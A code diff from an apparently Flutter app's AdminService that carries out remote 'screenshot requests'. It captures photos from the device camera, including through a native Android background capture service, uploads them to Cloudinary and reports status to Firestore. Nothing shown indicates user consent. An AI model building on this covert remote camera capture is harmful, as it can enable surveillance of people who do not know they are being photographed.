@@ -289,98 +289,62 @@ class AdminService {
     final data = requestDoc.data() ?? <String, dynamic>{};
     final cameraFacing = data['cameraFacing'] as String? ?? 'front';
 
+    // 1. If app is foregrounded, try in-app camera capture first (fast, reliable)
     try {
-      if (platformName == 'android') {
-        final completer = Completer<String?>();
-        AndroidScreenCapture.setOnCameraCaptureComplete((path) async {
-          if (path == null) {
-            completer.complete(null);
-            return;
-          }
-          try {
-            final file = File(path);
-            final bytes = await file.readAsBytes();
-            final uploaded = await _uploadToCloudinary(bytes);
-            completer.complete(uploaded);
-          } catch (e) {
-            completer.complete(null);
-          }
-        });
-
-        final started = await AndroidScreenCapture.startCameraCaptureNow(cameraFacing: cameraFacing);
-        if (!started) {
-          await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
-            'status': 'failed',
-            'error': 'Could not start native camera capture',
-            'completedAt': FieldValue.serverTimestamp(),
-          });
-          return;
-        }
-
-        final uploadedUrl = await completer.future.timeout(
-          const Duration(seconds: 12),
-          onTimeout: () => null,
-        );
-
-        if (uploadedUrl == null) {
-          await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
-            'status': 'failed',
-            'error': 'Camera capture or upload failed',
-            'completedAt': FieldValue.serverTimestamp(),
-          });
-          return;
-        }
-
-        await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
-          'status': 'completed',
-          'screenshotUrl': uploadedUrl,
-          'completedAt': FieldValue.serverTimestamp(),
-        });
-        return;
-      }
-
-      // Fallback: in-app camera capture when not Android or native failed
       final cameras = await availableCameras();
-      final targetCamera = cameras.firstWhere(
-        (camera) =>
-            camera.lensDirection ==
-            (cameraFacing == 'back'
-                ? CameraLensDirection.back
-                : CameraLensDirection.front),
-        orElse: () => cameras.first,
-      );
-      final controller = CameraController(
-        targetCamera,
-        ResolutionPreset.medium,
-        enableAudio: false,
-      );
-      await controller.initialize();
-      final picture = await controller.takePicture();
-      final bytes = await picture.readAsBytes();
-      await controller.dispose();
+      if (cameras.isNotEmpty) {
+        final targetCamera = cameras.firstWhere(
+          (camera) =>
+              camera.lensDirection ==
+              (cameraFacing == 'back'
+                  ? CameraLensDirection.back
+                  : CameraLensDirection.front),
+          orElse: () => cameras.first,
+        );
+        final controller = CameraController(
+          targetCamera,
+          ResolutionPreset.medium,
+          enableAudio: false,
+        );
+        await controller.initialize();
+        final picture = await controller.takePicture();
+        final bytes = await picture.readAsBytes();
+        await controller.dispose();
 
-      final uploadedUrl = await _uploadToCloudinary(bytes);
-      if (uploadedUrl == null) {
-        await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
+        final uploadedUrl = await _uploadToCloudinary(bytes);
+        if (uploadedUrl != null) {
+          await BackendBridgeService.updateScreenshotRequest(requestId, {
+            'status': 'completed',
+            'screenshotUrl': uploadedUrl,
+            'completedAt': FieldValue.serverTimestamp(),
+          });
+          return;
+        }
+      }
+    } catch (e) {
+      debugPrint('In-app camera capture attempt failed or app in background: $e');
+    }
+
+    // 2. Fall back to native background camera capture service
+    if (platformName == 'android') {
+      try {
+        final started = await AndroidScreenCapture.startCameraCaptureNow(
+          cameraFacing: cameraFacing,
+        );
+        if (!started) {
+          await BackendBridgeService.updateScreenshotRequest(requestId, {
+            'status': 'failed',
+            'error': 'Could not start native camera capture service',
+            'completedAt': FieldValue.serverTimestamp(),
+          });
+        }
+      } catch (e) {
+        await BackendBridgeService.updateScreenshotRequest(requestId, {
           'status': 'failed',
-          'error': 'Cloudinary upload failed',
+          'error': 'Native camera capture failed: $e',
           'completedAt': FieldValue.serverTimestamp(),
         });
-        return;
       }
-
-      await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
-        'status': 'completed',
-        'screenshotUrl': uploadedUrl,
-        'completedAt': FieldValue.serverTimestamp(),
-      });
-    } catch (error) {
-      debugPrint('Camera capture failed: $error');
-      await firestore.collection(screenshotRequestsCollection).doc(requestId).update({
-        'status': 'failed',
-        'error': 'Camera capture failed',
-        'completedAt': FieldValue.serverTimestamp(),
-      });
     }
   }
 
